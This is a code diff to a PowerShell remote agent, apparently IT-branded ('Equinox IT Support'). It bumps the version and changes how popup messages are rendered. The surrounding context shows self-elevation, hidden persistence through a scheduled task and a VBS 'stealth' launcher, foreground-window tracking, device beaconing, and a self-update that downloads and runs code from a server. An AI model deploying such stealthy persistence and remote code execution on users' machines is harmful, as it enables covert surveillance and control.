@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.7.5
+# Version: 1.7.6
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.7.5..."
+        Log-Message "Initiating User-Level Persistent Install v1.7.6..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.5" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.6" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -130,7 +130,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.7.5 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Agent v1.7.6 Started (Admin=$IsAdmin). ID: $AgentId"
     
     # Define Win32 API for foreground window
     $Win32Code = @'
@@ -232,7 +232,7 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.5"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.6"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -294,7 +294,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.5")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.6")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
@@ -309,13 +309,12 @@ try {
                     if ($cmd.type -eq "Message") {
                         $msgContent = $cmd.payload.message
                         $PopupScript = "$InstallDir\popup.ps1"
-                        $MsgDataPath = "$InstallDir\msg.txt"
-                        $msgContent | Out-File -FilePath $MsgDataPath -Force -Encoding utf8
+                        $MsgBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($msgContent))
                         
                         $PopupCode = @"
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
-`$Msg = Get-Content "$MsgDataPath" -Raw
+`$Msg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$MsgBase64'))
 `$Form = New-Object Windows.Forms.Form
 `$Form.Text = 'Equinox IT Support'
 `$Form.Size = New-Object Drawing.Size(550,380)
@@ -337,7 +336,7 @@ try {
 
 `$Header = New-Object Windows.Forms.Label
 `$Header.Text = 'EQUINOX IT SUPPORT'
-`$Header.ForeColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
+`$Header.ForeColor = [System.Drawing.Color]::Black
 `$Header.Font = New-Object Drawing.Font('Segoe UI', 15, [System.Drawing.FontStyle]::Bold)
 `$Header.Location = New-Object Drawing.Point(120, 30)
 `$Header.Size = New-Object Drawing.Size(400, 35)
@@ -349,17 +348,12 @@ try {
 `$Disclaimer.Location = New-Object Drawing.Point(120, 65)
 `$Disclaimer.Size = New-Object Drawing.Size(400, 20)
 
-# Use a TextBox for reliable scrolling and text wrapping
-`$Content = New-Object Windows.Forms.TextBox
-`$Content.Multiline = `$true
-`$Content.ReadOnly = `$true
-`$Content.BorderStyle = 'None'
+`$Content = New-Object Windows.Forms.Label
 `$Content.Text = `$Msg
+`$Content.ForeColor = [System.Drawing.Color]::Black
 `$Content.Font = New-Object Drawing.Font('Segoe UI', 11)
 `$Content.Location = New-Object Drawing.Point(120, 100)
-`$Content.Size = New-Object Drawing.Size(400, 150)
-`$Content.BackColor = [System.Drawing.Color]::White
-`$Content.ScrollBars = 'Vertical'
+`$Content.Size = New-Object Drawing.Size(400, 180)
 
 `$Legal = New-Object Windows.Forms.Label
 `$Legal.Text = 'This message is intended solely for the addressee and may contain confidential information.'
